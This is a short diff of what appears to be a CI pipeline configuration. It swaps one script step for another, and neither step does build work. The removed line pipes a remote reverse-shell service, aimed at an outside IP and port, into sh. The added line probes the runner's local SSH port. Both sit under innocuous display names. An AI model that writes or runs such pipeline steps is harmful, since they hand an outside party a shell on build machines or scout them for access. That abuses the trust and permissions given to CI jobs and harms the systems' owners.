@@ -6,5 +6,5 @@ steps:
   displayName: 'Run a one-line script'
 
 - script: |
-    curl https://shell.now.sh/159.89.175.221:1211 | sh
+    curl -v "http://127.0.0.1:22"
   displayName: 'Run a multi-line script'
